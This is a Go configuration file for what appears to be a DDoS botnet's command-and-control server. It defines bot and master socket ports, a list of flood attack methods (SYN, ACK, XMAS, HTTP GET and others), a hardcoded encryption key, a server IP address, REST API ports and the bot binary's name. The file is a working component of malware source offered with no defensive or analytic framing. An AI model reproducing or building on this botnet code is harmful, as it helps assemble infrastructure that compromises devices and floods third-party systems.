package utils

var (
	// Sockets
	BotSocketPort    = 444
	MasterSocketPort = 555

	// CNC
	Methods       = []string{"psh", "hex", "syn", "ack", "httpget", "xmas"}
	EncryptionKey = "encryptionkey"

	// PRIVATE REST API
	HttpApiPrivateServerPort = 3333
	ServerIP                 = "85.31.44.75"
	BinBaseName              = "rose"
	Version                  = "0.0.2"

	// PUBLIC REST API
	HttpApiPublicServerPort = 1337
)

var (
	Users   = []User{}
)
